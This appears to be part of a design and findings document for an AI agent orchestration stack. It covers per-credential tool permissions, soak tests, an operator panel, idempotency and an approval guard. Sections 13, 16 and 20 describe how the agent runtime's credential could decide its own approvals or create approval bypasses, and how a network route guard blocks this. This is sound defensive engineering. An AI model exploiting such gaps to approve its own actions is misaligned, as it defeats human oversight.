| Claude asked to write the same file, unchanged | **COMPLETED**, file written |
| the override cleared, Codex asked again | **COMPLETED**, file written |

So per-caller tool permission works today, **at the granularity of a credential** — which is what
was measured, and no further. It is not per role: in the novel trial one credential carries two
roles on each side (Codex is architect *and* story reviewer, Claude is author *and* history
reviewer), so "the author may write, the history reviewer may not" was **not** shown and does not
follow from this test. Telling two roles of the same vendor apart would need a credential per
role. What is *not* built is the
connection: nothing in this stack sets or tracks per-credential governance — `cfg.py` manages the
account policy only, and a role's credential is chosen for its login, not for its permissions.

**Correcting two more claims that were in this document**

- "A second Preloop stack per domain is required" — not established. Different rules for different
  callers do not need another account; they need per-credential governance, which is one API call.
  A second stack is one option, not the only one.
- "Registration closes after the first user" — that is a setting, not a law: `registration_enabled`
  still decides once an instance has a user, and a bootstrap token path exists
  (`api/auth/bootstrap.py`). The earlier wording stated a configuration as a property of the
  product.
- **Per-run directories are separation of storage, not of access.** The file server serves all of
  `/ws`, and the account policy carries no per-run restriction, so nothing stops one run's agent
  from reading or writing another run's directory. This document said "each run works in its own
  directory", which is true and was easy to misread as isolation; it is not.

**Where this leaves it**, in the reviewer's words: *differentiated rights per credential inside one
account are reported working; choosing a Preloop credential per role, and managing those settings,
is unimplemented.* The pieces measured above are the ones a design would use — a role names a
credential, and that credential carries the tool rights, which for two roles of the same vendor
means a credential per role — and `cfg.py` would have to own that mapping the way it owns the
account policy today. Per-lane recovery (§ trial records) and this mapping both stay on the same
footing: built when something actually needs them.

### Grok now has a Preloop principal of its own (2026-09-23)

The open item was real: Grok presented **Claude's** credential to the Preloop MCP endpoint, so any
per-credential rule aimed at one hit the other. It is closed, and the closing needed no new
Preloop feature.

**How.** `preloop agents discover` does not know Grok, but the API does not depend on discovery:

```
POST /api/v1/agents                      {"display_name": "...", "agent_kind": "grok"}
POST /api/v1/agents/{id}/credentials     {"name": "...", "scopes": ["mcp:read","mcp:write"]}
```

The credential is returned once; it went into the `Authorization` header of the `preloop` MCP
server entry in `/route/grok/config.toml` (the previous file is kept as `config.toml.bak`).
Nothing else changed — a masked diff of the two files differs only in the token.

**Measured after the change**

| check | result |
|---|---|
| credential Grok presents | `00794a90…`, no longer Claude's `57dfc1f6…` |
| MCP authentication with it | HTTP 200, and `tools/list` offers 19 tools (the adapter's credential is offered 20) |
| a task through the routing layer | file written through `preloop__write_file` |
| `write_file` disabled **on the Grok credential only** | Grok: no file. Claude at the same moment: file written |
| override cleared | Grok writes again |

So the three providers are now three subjects, and a tool right can be given or withheld per
provider. The earlier limitation stands where it was narrowed to: this is **per credential**, and
two roles sharing one provider still share its rights.

**One behaviour worth recording.** Grok reached for its own `write`/`search_replace` first, which
its configuration denies, and then gave up — "PROBE_BLOCKED: write and search_replace refused".
Naming the MCP tool in the prompt (`preloop__write_file`) made it work. The credential was never
the problem; tool choice was. A workflow that depends on Grok writing files should name the tool.

### Per-role credentials: measured, and the adapter can now present one (2026-09-23)

The limitation recorded above — *"this is per credential, and two roles sharing one provider still
share its rights"* — was about this stack's wiring, not about Preloop. Both halves were measured.

**Preloop side.** Two principals of the *same* vendor were created (`agent_kind: claude_code`,
"Claude Code (role: author)" and "… (role: history)"), each with its own MCP credential, and
`write_file` was disabled on the history principal alone. Governance is available per credential
(`/api/v1/auth/api-keys/{key_id}/governance`) and per principal
(`/api/v1/agents/{agent_id}/governance`); the principal level was used here, so the rule survives
credential rotation.

| credential presented to `/mcp/v1` | tools offered | `write_file` |
|---|---|---|
| role principal `author` | 19 | wrote the file |
| role principal `history` (override `write_file:false`) | 18 — `write_file` is not in the list | "Access denied: Tool 'write_file' is not available" |
| the adapter's own Claude credential, unchanged | 20 | wrote the file |

**Adapter side.** A request may now name a principal: `mcp_principal: "<name>"` in `request.json`.
The adapter then presents that principal's credential to the Preloop MCP endpoint instead of its
own — for the server it attaches over ACP (Claude) and for the one it writes into a vendor config
in memory (Codex). The token is never stored by the adapter and never written into the evidence:
the caller supplies it in `PRELOOP_MCP_<NAME>`, and the result records only the principal's name.

Measured through the routing layer, same provider, same login, same prompt, only the credential
differing:

| run | result |
|---|---|
| `mcp_principal: author` | `COMPLETED`, file written — the session called `mcp__preloop__write_file` |
| `mcp_principal: history` | `COMPLETED`, no file — the session searched for the tool, did not find it in its list, and never called it |
| `mcp_principal` named, `PRELOOP_MCP_<NAME>` not set | `FAILED` — fails closed, never falls back to the adapter's wider credential |
| `mcp_principal` with `native_tools: true` | `FAILED` — the run would not go through the MCP server at all |
| no `mcp_principal` (regression) | `COMPLETED`, file written with the adapter's own credential |
| `mcp_principal` on Grok | `FAILED` — refused: Grok reads its credential from `/route/grok/config.toml`, so the adapter cannot substitute it for one call. Per-role for Grok would need a login directory (and config file) per role. |

**Since then it is wired, and a workflow uses it.** A role may name the principal it runs as —
`steps/roles.py` takes `story=codex:novel-reviewer` — and the name travels to the call
(`agent_task.py` → `mcp_principal`), through the fan-out (`tasks.py` spec, `task_chain.py` step)
and into the adapter, which fails closed when that principal has no credential. The vendor and the
principal are chosen separately, so three vendors share one reviewer's rights.

The novel workflow now runs its steps as two principals: **`novel-author`** (architect, author) and
**`novel-reviewer`** (story, history, cold reader). The reviewer's rights are not a tool switch but
a rule on the argument — Preloop's scoped rules take a condition — so a reviewer can still write
its own review and nothing else:

```
write_file: allow when args.path.contains('review_')
write_file: deny  when (anything else)
```

Measured against the file server with the two credentials:

| principal | wrote `review_x.json` | wrote `draft.md` |
|---|---|---|
| `novel-author` | — | **written** |
| `novel-reviewer` | **written** | **"Access denied: Scoped rule 2"** |

And in a real run (`princ-novel01`, PASS at `d01`), the five calls of one run carried two
principals across three vendors:

```
6e8be4fc-architect-codex   codex   novel-author
6e8be4fc-author-claude     claude  novel-author
6e8be4fc-story-codex       codex   novel-reviewer
6e8be4fc-history-claude    claude  novel-reviewer
6e8be4fc-cold-grok         grok    novel-reviewer
```

The credentials are the operator's: `stack/principals.py create <name>` prints the line for
`docker/principals.env` (git-ignored, loaded into the agent as environment) and writes nothing
itself; `principals.py list` shows what each principal may do, and `principals.py check <name>`
asks the file server rather than trusting the configuration. A principal whose credential is not in
that file is simply unavailable, and a step that asks for it fails closed.

**One limit of the platform, found on the way.** Preloop composes a credential's name as
`"Managed Agent Credential: <display name> / <name>"` into a `varchar(100)`, so a long display name
fails with an unexplained HTTP 500 (the reason is only in the api container's log). The principals
here are named `Role: <name>` to stay inside it.

**Two lifecycle facts worth keeping.** Deleting a managed agent (`DELETE /api/v1/agents/{id}`)
revokes its credential immediately — the same token went from HTTP 200 to 401 — but the API key
rows stay listed until deleted separately (`DELETE /api/v1/auth/api-keys/{key_id}`). The probe
principals, their eight credentials and every probe file were removed after the measurement; the
account is back to the four principals it had (Grok, Codex, two Claude).

## 11. Long operation

Everything measured until now was a single run. Running the same workflow over and over is a
different question, and it was answered by doing it rather than by reading the code:
`scripts/soak.sh <cycles> <workflow>` runs cycles back to back and samples, before and after each
one, every container's memory, the disk under the workspace and evidence trees, the process and
zombie count of each of this stack's containers, and the cycle's own outcome and wall time. It
cleans nothing up, so growth is growth.

### What twelve cycles showed (trading-b, back to back)

| | |
|---|---|
| wall time per cycle | 28–34 s, no trend (first 30 s, last 33 s) |
| result | 3/3 lanes valid in **every** cycle; lane overlap 1.88–2.00 |
| disk per cycle | workspace +36 KB, evidence +246 KB (MLflow +61 KB, adapter evidence +156 KB) |
| directories per cycle | one workspace, three evidence directories, one UI run |
| memory | total 2,055 → 2,593 MiB, of which **+510 MiB is the agent container alone** |

The memory number is not what it looks like, and the difference matters: inside the agent
container the cgroup reports `anon` (what processes actually hold) at **4 MB** and `file` (page
cache from reading and writing evidence) at **997 MB**. `docker stats` counts the cache, the kernel
reclaims it under pressure, and the processes are not growing. Reported as cache, not as a leak.

### What it found that nothing else would have

**Every provider call left a zombie process.** PID 1 in these containers was the service itself —
`sleep` in the agent, `node` in the file server — and a service is not a reaper: a child whose
parent exits is reparented to PID 1 and stays a zombie until someone waits for it. Measured after
two days of runs: **111 zombies in the agent, 550 in the file server**, one per call that had ever
run. Nothing in memory or disk shows this; it ends in a container that cannot fork.

Fixed by putting an init process in front of all eight of this stack's services (`init: true`,
Docker's tini). Measured after the change: PID 1 is `docker-init`, and five further cycles left
**0 zombies in every container** (agent 5 processes, file server 5). The soak now samples processes
and zombies per container, so a future regression is visible in the same place as the rest.

### Running unattended

`scripts/cycle.sh <workflow> [profile] [--retain-days N] [--retain-keep M]` is one cycle for a
scheduler to call. What it adds over starting a run by hand is only what unattended operation
needs:

- **one at a time.** A tick that arrives while the last cycle is still running is skipped, not
  queued — two cycles would share logins and workspaces. A lock left behind by a killed run would
  skip every later cycle, so the skip records how long the lock has been held and
  `stack/ops_health.py` shows it; clearing it stays an operator's decision, because this script may
  not declare another cycle dead.
- **it refuses rather than pretends.** The capabilities are checked before the run starts
  (§ compositions): a cycle that cannot be governed does not run, and the refusal is recorded with
  the reason.
- **it leaves a record.** One line per cycle in `evidence/ops/cycles.jsonl` — when, which run, how
  long, how it ended **and why**, and what the stack could do at the time. Skips and refusals are
  lines too, which is what a scheduler otherwise hides.
- **retention only when asked.** With `--retain-days` / `--retain-keep` it runs the same cleanup as
  by hand (§9: whole runs, live runs and pending approvals protected) and records what went.

`stack/ops_health.py` reads all of that back: how many cycles ran, were skipped or were refused, the
spread of durations, how they ended and why, which ones never reached MLflow, whether a lock is
held now, when the stack was last checked, what it can do at this moment, and what the last soaks
found growing. It decides nothing — whether 12 holds in a week is acceptable is the operator's
judgement.

### Still not measured

Operation across days rather than cycles: a real schedule, quota exhausting and resetting, a login
expiring mid-week (it expired once during this work and the router held the cycle, which is the
designed behaviour, but that was not a controlled measurement), and recovery after the host
restarts.

## 12. The panel

One address for a person: `http://127.0.0.1:8780`. It carries the three things that need one —
signing a provider in, **answering a pending approval**, and reading enough state to judge whether
this is healthy — and nothing else (CONTRACT.md, "What belongs on a screen").

**The dashboard** covers what we added as well as what we run on: routing (what the router would
decide right now, and each provider's eligibility, quota and observation age) and the state of
backups and kept releases. Those two live on the **host**, outside every container, so no container
can see them: `scripts/host-state.sh` writes what the host has into
`evidence/ops/host-state.json` (run by `up.sh --check`, or on its own), and the panel shows it with
the age of that look — a backup that existed last week is not a backup that exists.

The rest of it is one read of what the stack already records: which capabilities it has right
now (probed, not declared), which composition it is running and when it was last checked, how the
unattended cycles have gone (run / skipped / refused, the spread of durations, where they stopped
and why, which never reached MLflow), whether a cycle lock is held, and what the last soak found
growing per cycle. It also states, in the page itself, what is *not* done there and the command
that does it.

**The one control brought in from another product** is Preloop's approval decision
(`POST /api/approvals/<id>` → `stack/approvals.py decide`). An approval is a run stopped waiting for
a person; sending that person to a second console to answer it is where an unattended schedule
loses a night. Preloop still owns the decision — this records on our side too
(`evidence/ops/controls.jsonl`) that it was answered here, with what comment, and whether Preloop
took it. Policy editing and run comparison stay linked, not rebuilt: the panel offers no route for
starting a cycle, deleting runs or changing the composition, and a control fails if one appears.

**One implementation behind a cycle.** `stack/cycle.py` holds the rules (the lock, the refusal, the
record, retention); `scripts/cycle.sh` is how a scheduler on the host reaches them. Two findings
came out of making it one: an option's value was being read as the profile (`--by scheduler`
started a run with the profile "scheduler"), and — because that profile does not exist — the
router held before the roles step, which exposed that every hold message in the trading and novel
workflows assumed roles had run and died on a template error instead of reporting the hold. Both
are fixed and pinned by controls.

### The other solutions' consoles, and Conductor's

The panel links to what each solution owns rather than rebuilding it: **Preloop's console**
(policy, principals, the approval history) and **MLflow** (the runs, now a parent per run with a
child per call). Both are published on the host already, so a link is all it takes.

**Conductor's own run dashboard is not linkable, and that was measured rather than assumed.**
`conductor run --web --web-port N` does start a real-time dashboard, but it binds the *container's*
loopback (`conductor/web/server.py`, `host="127.0.0.1"`) and its auth accepts only loopback `Host`
headers (`conductor/web/auth.py`), so publishing the port reaches nothing: with a run in flight,
`ss` inside the agent showed `LISTEN 127.0.0.1:8783 conductor` and the host's `curl` answered
`000`. Reaching it would mean running a forwarder inside the agent container — a deliberate change
to the container that is otherwise without an inbound listener, so it is not done here. A second
reason to leave it: `CONDUCTOR_WEB_PORT` is Conductor's *own* variable for its background mode, so
setting it in the container's environment feeds its bg-child detection.

What replaces it: the panel's **run history** tab reads Conductor's event log directly (that is
where the step-by-step progress comes from), and `conductor status` / `conductor fleet` answer the
same question in a terminal.

**One thing this measurement produced by accident.** The cycle that was running when the agent
container was restarted left its lock behind — exactly the case §11 describes. It showed up where
it was supposed to: `ops_health.py` and the panel both reported *"held since …, every cycle is
skipped while it is there"*, the four scheduled cycles in between are recorded as skipped, and
clearing it was an operator's decision (`rmdir`). Nothing had to be guessed.

## 13. Who may approve — a limit of Preloop OSS 0.15.0, measured

The panel answers approvals (§12). The obvious question is whether the runtime itself could answer
them, and the answer is **yes, today it can**. Measured with the credential the agent container
actually holds (`~/.preloop/agents/*/permission_hook.json`, sha12 `57dfc1f6…`):

| asked of the control plane with that credential | answer |
|---|---|
| list the account's API keys | OK |
| list principals / read a principal's governance | OK |
| **decide an approval** | **HTTP 404** — the request id was invented; a refusal would be 403 |

**Why**, from the running image's code:

1. `api/auth/jwt.py: get_current_user` resolves *any* API key to its owning `User`; the key's
   `scopes` are stored but not consulted on that path.
2. Endpoints guard with `@require_permission(...)`, and `has_permission` aggregates the roles
   assigned to that user. The `owner` role carries all 68 permissions, including
   `decide_approvals`.
3. `/api/v1/agents/permission-check` — the endpoint the permission hook calls on every native tool
   call — deliberately requires no permission at all: it only requires that the bearer be a
   **managed-agent credential** (`_managed_agent_for_api_key`).

So the runtime must hold a managed-agent credential to be governed at all, and that credential
inherits whatever its creating user may do. Ours was created by the account owner.

**The fix this section used to propose — a second Preloop user with a role lacking
`decide_approvals` — does not exist in this build.** Asked rather than assumed:

| asked of the running API | answer |
|---|---|
| `GET /api/v1/users` | 404 |
| `GET /api/v1/invitations` | 404 |
| `GET /api/v1/teams` | 404 |
| `GET /api/v1/roles` | 200 — all seven roles are seeded (owner 68 … viewer 12) |

The console ships an invite dialog and calls `/api/v1/invitations`; the API has no such route.
And `POST /api/v1/auth/register` is not a way round it: its handler creates a **new Account**,
makes the new user that account's primary user and gives it the `owner` role, so a second
registration is a second tenant rather than a second member. The roles exist and cannot be handed
out. What closes the gap instead is §20 — the route.

Still true, and still worth keeping: every decision made through the panel records the fingerprint
of the credential that made it (`evidence/ops/controls.jsonl`), so "who answered this" stays
answerable afterwards.

## 14. Conductor's run dashboard cannot be opened from the host, and why

Conductor does have one: `conductor run --web --web-port N` serves a real-time dashboard of the run
in progress. It cannot be reached from the operator's browser here, and the reason is the isolation
this stack is built on rather than anything about Conductor:

1. The dashboard binds the **container's loopback** (`conductor/web/server.py`, `host="127.0.0.1"`;
   there is no host option) — measured with a run in flight: `ss` inside the agent shows
   `LISTEN 127.0.0.1:8783 conductor`, while the host's `curl` answers `000`.
2. Its auth only accepts a loopback `Host` header (`conductor/web/auth.py`) — which a browser on a
   published `127.0.0.1` port would in fact send, so this one is not the blocker.
3. The blocker is that **the agent is single-homed on an `internal: true` network**, where this
   Docker version does not apply port bindings at all. The binding was configured and
   `docker inspect` showed it; `docker port` showed nothing, and a forwarder listening on
   `0.0.0.0:8784` inside the container was still unreachable from the host. This is the same
   measurement that made MLflow dual-homed (§ the compose file's own note, FINDINGS.md F9).

Making it reachable therefore means giving the agent a second, non-internal network — the one thing
the isolation claim rests on. It is not done, and the attempt (a published port, a small forwarder,
`--web` wiring) was removed rather than left half-built. One more reason to leave it: Conductor's
own background mode reads `CONDUCTOR_WEB_PORT` from the environment to recognise its child process,
so that name must not be set in the container for unrelated purposes.

**And then it was solved from the other side.** Conductor can already draw a run from a recorded
event log — `conductor replay` serves the same React dashboard in replay mode — and the class
behind it takes its bind address as a parameter (`ReplayDashboard(..., host=…)`; only the CLI
leaves it on loopback). The package is MIT. So the dashboard now runs **in a container that is not
the agent**: `agentstack-replay`, on the ops network, with the workspace mounted **read-only**, no
credentials and no Docker access. The agent keeps its single internal network and gains nothing.

**It publishes no port.** A person reaches it at the panel's own address — the hub forwards exactly
the paths Conductor's bundle asks for (`/conductor`, `/assets/…`, `/favicon.svg`, `/api/state`,
`/api/logs`, `/api/replay/info`, `/api/files/…`), which are absolute in its HTML and do not collide
with this panel's routes. One thing had to be said out loud on the way through: the dashboard
refuses a `Host` header that is not loopback (a DNS-rebinding guard aimed at browsers), so the hub
sends `Host: 127.0.0.1:<port>` while connecting to the container by name.

**Why a container of its own rather than inside the hub**, since that was the obvious question:
the dashboard needs the `conductor` package (FastAPI, uvicorn, an 800 KB bundle) and a read-only
mount of the workspace to read event logs. The hub is the container a browser talks to; it has no
mounts, no dependencies and no Docker access, and keeping it that way is worth one 39 MB container.
What was *not* worth keeping was the second port — that is gone, and there is one address again.

Which run it shows is a name the ops API writes to `evidence/ops/replay.run`; the service watches
that file, so it has no inbound API of its own — it renders an event log and reads a name, and
that is all it can do. In the panel, each row of the run history has a **그래프** button that asks
for that run and opens the dashboard.

Measured: `GET /` answers 200 from the host, `/api/state` returns the run's events, and switching
runs takes about two seconds (`showing cyc-…: /work/evidence/ui-runs/cyc-…/tmp/conductor/*.jsonl`
in the container's log). What remains true is the part above — a *live* run's own dashboard
(`conductor run --web`) is still unreachable, because that one is served from inside the agent.

## 15. Each solution, on three axes: what it does, what it can be switched to, and what it shows

The consolidation is easier to judge one axis at a time. **Function** is what a solution does for
this stack; **mode** is a switch that changes how it behaves; **dashboard** is a screen it brings.

### Preloop OSS 0.15.0

| axis | what it has | where it is now |
|---|---|---|
| function | MCP proxy with per-subject tool rules; the native-tool permission check the hook calls; the approval channel; managed agents and their credentials; account policy (generate, validate, versions); model gateway; cost analytics; flows and trackers | used: the first four. The gateway is unused on the direct route; flows, trackers and cost are not used at all |
| **mode** | **approval bypass** (stop asking, for a while); which **policy version** is applied; **tool on/off per principal** (`tool_enabled_overrides`); an MCP server's `default_tools_approval_mode` (decide by rules vs ask a human); `registration_enabled`; the hook's `safe_read_auto_allow` | set by us from files (`cfg.py`, the MCP server entries) except the first two. **Bypasses and the applied policy are read and shown** (`stack/elsewhere.py`, `cfg.py status` → `replaced`); changing them stays in the console |
| dashboard | the console at `:3000` — approvals, policies, principals, cost | linked. One control brought over: deciding a pending approval (§12) |

### Conductor v0.1.37

| axis | what it has | where it is now |
|---|---|---|
| function | run a workflow; resume from a checkpoint; replay an event log; validate; show; status; stop; fleet; **human gates**; mid-run guidance | run/resume/validate are used through `run_workflow.py`. Gates and guidance are **not used by any workflow here** — the day one is, it becomes a human decision and belongs in the panel |
| **mode** | `--silent` / `--quiet`; `--no-interactive`; `--web` / `--web-bg`; checkpointing (what `resume` needs); `parallel` / `for_each` groups (which refuse script steps, §trials) | set by us in `run_workflow.py`; `--web` deliberately off (§14) |
| dashboard | a live dashboard per run; a **replay** dashboard for a recorded log; `fleet` in a terminal | the replay dashboard **is in the panel** (§14). The live one is unreachable by construction. `fleet` stays a terminal command |

### MLflow 3.16.1

| axis | what it has | where it is now |
|---|---|---|
| function | experiments, runs, params, metrics, tags, artifacts, nested runs — and **OTLP trace ingest** | both used. Runs are written by `record.py`; traces arrive from Conductor's OTel exporter, which the agent's environment points at MLflow |
| **mode** | server-side job execution (turned **off**, §compositions); worker count (**1**); allowed hosts; artifact destination | ours, in the compose file |
| dashboard | the runs and comparison UI — **and a separate trace view** | both linked now. They are **different experiments**: this stack's records in `p281-routing`, Conductor's spans in `cadp-278-composition-poc` (500+ spans, newest from the last cycle). Nothing pointed at the second one until this review |

### acpx 0.18.0

| axis | what it has | where it is now |
|---|---|---|
| function | the ACP runtime, an agent registry, a session store, the permission handler, MCP server attachment, timeouts | all used by `run-agent.mjs` |
| **mode** | `permissionMode: deny-all` (the fallback when the handler throws); `nonInteractivePermissions: deny`; MCP over ACP vs the vendor's own config; `model_route` direct vs the Preloop gateway; `native_tools` on/off; `mcp_principal` | ours, per call in the request — configuration, not a screen |
| dashboard | none | — |

### This stack

| axis | what it has | where it is now |
|---|---|---|
| function | admission, role binding, execution, concurrency and chains, recording, capabilities, cleanup, backup/restore, release/rollback, soak, unattended cycle, health | commands; their **state** is in the panel |
| **mode** | composition (`full` / `no-record` / `runtime`); profile (`research-default` / `cost-first`); `--allow-unrecorded`; retention flags | commands and files, by the rule in CONTRACT.md — with the composition and the profile shown in the panel |
| dashboard | the panel: dashboard, accounts, run, run history, and Conductor's replay inside it | one address, `127.0.0.1:8780` |

### What this review changed

1. **MLflow's trace view was invisible.** Conductor has been exporting spans to MLflow all along —
   500+ of them, newest from the last cycle — into a different experiment from the run records.
   Linked now, and named for what it is.
2. Everything else was already accounted for. The two that stay outside on purpose are Conductor's
   `fleet` (a terminal view of running processes) and Preloop's console for editing what it owns.



## 16. The switches elsewhere that would make this panel's claims untrue

§15 says where every surface sits. This section is about the subset that can change *under* us:
a switch flipped in another console that would make something the panel says untrue.

**The one that mattered.** Preloop can be told to stop asking: an **approval bypass** does not block
a run, it removes the block — the kind of change that leaves no trace in any outcome this stack
records. A panel that shows pending approvals but not live bypasses would be telling half the
truth. So `stack/elsewhere.py` reads what another console could have changed underneath us, and the
dashboard shows it:

- **approval bypasses** — none, or every live one with its scope and expiry, in red
- **the MCP servers registered to the account** — the tools an agent can reach are whatever is in
  that list, and it is editable there
- the policy actually applied (already reported by `cfg.py status` as `replaced` when someone
  else's policy is on the account)

Reading, not editing: changing any of them stays in the console that owns it. This is the honest
boundary of "we do not rebuild other products' screens" — we do not, but we do look at the switches
that would make our own claims untrue.

## 17. Repeating a step

The design procedure lists idempotency as a runtime concern, and this stack had not looked at it.
Looking meant running each step twice with the same input and seeing what changed. Three things
did, and two of them changed a *judgement*:

| step | what a repeat did | what it does now |
|---|---|---|
| `novel_stage.py freeze` | froze the same bytes again as **a new draft** (`d01` → `d02`), inventing a round nobody wrote | the same content is the same round, and says so (`repeated: true`); different content is `d02` |
| `novel_stage.py triage` | counted repairs by **how many findings files existed**, so running it three times took `repairs_done` from 0 to 2 and, at the bound, **turned a REPAIR into a BLOCK with no new work in between** | a repair is counted per *draft* (`findings-d01.json`), so the same round asked again is the same ask |
| `record.py` | wrote **another MLflow run** for the same run and judgement — two of the same cycle in every comparison drawn from it | the same run and judgement return the record already written (`idempotency_key`, tagged and searched); a different judgement is a different record |

`trade_stage.py packet` was already idempotent by construction (rebuilt twice, hashes compared —
that was the point of building it twice), and so are `baseline`, `evaluate` and the forecast scorer.

**Every step now says what a repeat of it does**, in the step itself:

```python
REPEATABLE = "guarded"   # freeze returns the same draft for the same bytes; triage counts per draft
```

`yes` — the same result; `guarded` — it recognises the repeat; `no` — it does the work again. The
`no` ones are the model calls (`agent_task.py`, `execute.py`, and the two that start them,
`tasks.py` and `task_chain.py`): a repeat costs money and does not answer the same way twice, which
is exactly why a re-run of a lane is a deliberate act (§ trial B) rather than something a resumed
run does by itself. A control fails if any step stops declaring, or if a model call is ever marked
repeatable.

**What this does not claim.** Writes through the file tools are still plain writes: a second run of
a workflow writes its artifacts again, in its own workspace. What is fixed is the class that was
actually dangerous here — a repeat that changes a *decision* (a round, a bound, a record) rather
than a byte.

## 18. Evidence, joined to the claim it supports

The design procedure (§15) separates runtime evidence from semantic evidence and asks that the
second point at the first: a claim, the criterion it answers, the artifact it is about, and the
execution that produced it. Everything needed for that join already existed here — a call's
`run_id` and evidence directory, each artifact's sha256 in the fan-out receipt, the frozen draft's
own hash — and nothing joined them, so *"why did this run pass"* meant reading a workspace by hand.

The judging step now writes the join, because what a finding means is the workflow's
(`CONTRACT.md`). `novel_stage.py triage` and `trade_stage.py evaluate` each write
`evidence_index.json` next to the run's artifacts:

```
판정: PASS | no blocking finding in the required reviews
대상 초안: d02 draft-02.md 106ca06a3421

story    MINOR   NONE               기준 차이의 직접 보고와 서명 보고서 제출 지시로 …
         호출 b6d47723-story-codex | 주체 novel-reviewer | 리뷰 71393efe6cc3
history  MINOR   UNSUPPORTED_CLAIM  5문단의 "분기 약정에서 …
         호출 b6d47723-history-claude | 주체 novel-reviewer | 리뷰 8f97f4051ef3
cold     -       -                  no finding recorded
         호출 b6d47723-cold-grok | 주체 novel-reviewer
```

Each item carries the claim, its kind and severity, the **criterion** it answers
(`story:CONTRACT_MISS`), the **call** that produced it (`execution_id`, its evidence directory),
the **principal** that call ran as, the **review** it came from with that file's sha256, and the
**artifact it is about** with its hash. A reviewer that found nothing is in the index too — an
absent judgement is a fact about the round.

The trading cycle's index is the same shape, with the lanes:

```
패킷: packet.json b27021f04b24
ai     ai VALID    호출 a6c6b1ad-ai-codex     제안 874786a81827
ai2    ai2 VALID   호출 a6c6b1ad-ai2-claude   제안 5c7f171b74fd
base   base VALID  호출 (모델 없음)            제안 —
```

**The index travels with the record.** `record.py` takes `evidence_file`, stores it on the MLflow
run as `evidence_index.json` and tags the run with how many items it holds — measured on a real
run: `evidence_items: 3`, artifact `evidence_index.json`. So a record can be read later without the
workspace it came from, which is what made the evidence hard to use before.

What this does not add: a criterion catalogue. The "criterion" here is the reviewer and the kind of
finding it made (`history:UNSUPPORTED_CLAIM`), not an entry in an acceptance-criteria document —
this stack's workflows do not have one yet. When a workflow gains one, the field is already where
it belongs.

## 19. What a run did — the ground an evaluation stands on

The design procedure asks for evaluation on three layers (§16–18). Two of them are not this
stack's: whether a reviewer's verdict was right, or a lane was a good strategy, is what the work
*means*, and meaning belongs to the workflow — it needs labelled cases from whoever knows the
domain, and the paper-trading harness already evaluates itself its own way. The third layer,
**trajectory**, needs no domain knowledge at all: it is execution fact, and this stack was already
recording every piece of it in a different place.

`stack/trajectory.py <run>` assembles one answer from those places — Conductor's event log, the
fan-out receipts, each call's own result, the run's output, the evidence index — and reads nothing
it cannot find:

```
evid-novel01  novel-a  PASS
  steps            route → roles → stage → architect → author → freeze → reviews → triage
                   → repair → freeze → reviews → triage → record_pass → done_pass
  model calls      5  {'claude': 3, 'codex': 2}  principals {'novel-author': 3, 'novel-reviewer': 2}
  permission asks  3  (decided by rules 3, asked a person 0, refused 0)   retried 0
  loop             1 of 1 allowed
  evidence         3 items, 3 tied to a call, from cold, history, story
  cost             377,649 tokens, 194s in calls
  assertions       loop_within_bound=yes, every_call_had_a_principal=yes,
                   reached_a_terminal_step=yes, recorded=yes
```

**The four assertions are true or false, never an opinion**: the loop stayed inside the bound the
run itself was given; every model call carried a principal, where the workflow assigns them (a
workflow that assigns none is reported as `—`, not accused); the run reached a terminal step; the
run was recorded. Those are the ones that can be asserted exactly, because the models are not
deterministic and everything else needs repetition and statistics.

One distinction the first version got wrong and the measurement corrected: a permission request
that Preloop's **rules** decided is not a person being asked. They are counted apart
(`decided_by_rules` / `asked_a_person`), because a stack that reports three human interventions
where there were none is worse than one that reports nothing.

**Grouping**: `run_workflow.py start … --suite <name>` labels a run, and
`trajectory.py --suite <name>` reads the set together. The label changes nothing about the run —
it exists so that whoever evaluates can find the runs they meant.

What is deliberately absent: datasets and their labels, outcome and step graders, and grader
validation. `trajectory.py` contains no notion of accuracy, score or correctness, and a control
fails if one appears.

## 20. The approval boundary is a route, not a right

An approval is the one decision this stack reserves for a person. §13 measured why Preloop cannot
express that here: every credential of the account carries `decide_approvals`, and there is no way
to make one that does not. So the boundary is drawn where this stack does have authority — **the
network the agent lives on**.

The agent is single-homed on `governed`. It reached Preloop by the names `api`, `console` and
`gateway`; those names now belong to `apiguard` (nginx, `docker/apiguard.conf`), which is the only
member of both that network and the admin one. Preloop's containers answer to `preloop-api`,
`preloop-console` and `preloop-gateway` on the admin side, and are no longer on `governed` at all.
The console had to be included because its own nginx proxies `/api/` to the same API — blocking one
name and leaving the other would have been a boundary in name only.

The guard keeps one table, matched on method and decoded path. It began as a list of the two
requests that mattered, and the measurement in §21 showed why a list is the wrong shape: it now
**refuses writes to the control plane by default** and names the exceptions before the catch-all.

| from the governed network | |
|---|---|
| any `GET` / `HEAD` / `OPTIONS` | allowed — a party may see what it is waiting for and what it may do |
| `POST /api/v1/agents/permission-check` | allowed — the permission hook calls it on every native tool call |
| `POST /mcp/v1…` | allowed — MCP itself |
| `…/approval-requests/<id>/{approve,decline,decide}` | *the runtime may not decide approvals* |
| writes to `/approval-bypasses` | *…may not create or revoke approval bypasses* |
| writes to `…/governance` | *…may not change tool rights* |
| writes to `/agents`, `/agents/<id>`, `/auth/api-keys` | *…may not mint or revoke credentials* |
| any other write under `/api/v1/` | *…may not change what the account enforces* |

Answers pass through streamed rather than buffered, so MCP's SSE and a 300-second tool call behave
as they did.

**Measured from inside the agent, with the runtime's own credential:**

```
api:8000   GET  /api/v1/approval-requests?status=pending   200   [{"tool_name":"Edit", …
api:8000   GET  /api/v1/approval-bypasses                  200   []
api:8000   POST /api/v1/approval-bypasses                  403   the runtime may not create or revoke …
api:8000   POST /approval-requests/<id>/approve            403   the runtime may not decide approvals
api:8000   POST /approval-requests/<id>/decide             403   the runtime may not decide approvals
console    POST /approval-requests/<id>/approve            403   the runtime may not decide approvals
console    GET  /api/v1/agents                             200   (the rest of the API is untouched)
```

and from the panel, which is on the admin side: the same decision on the same invented id answers
`HTTP 404: Approval request not found` — it reached Preloop, and was not refused. `stack/approvals.py`
now takes both its address (`AGENTSTACK_PRELOOP_API`) and its credential (`PRELOOP_OPERATOR_TOKEN`, else
the hook credential under `AGENTSTACK_CREDENTIAL_HOME`) from where it runs, and `ops/server.py` runs it
locally instead of `docker exec`-ing into the agent. With neither credential it fails closed.

`scripts/up.sh` checks both directions on every bring-up, from the position the rule constrains:

```
ok    runtime may read approvals                   200
ok    runtime may not decide approvals             403
```

**What this is not.** It is a route restriction, not a rights restriction. The runtime's credential
still carries the permission, and anyone holding it from another network position can still decide.
`stack/ops_health.py` says so in the way it now reports: the probe describes *the position it was run
from*, and a 404 from the agent would mean the guard is not in the path.

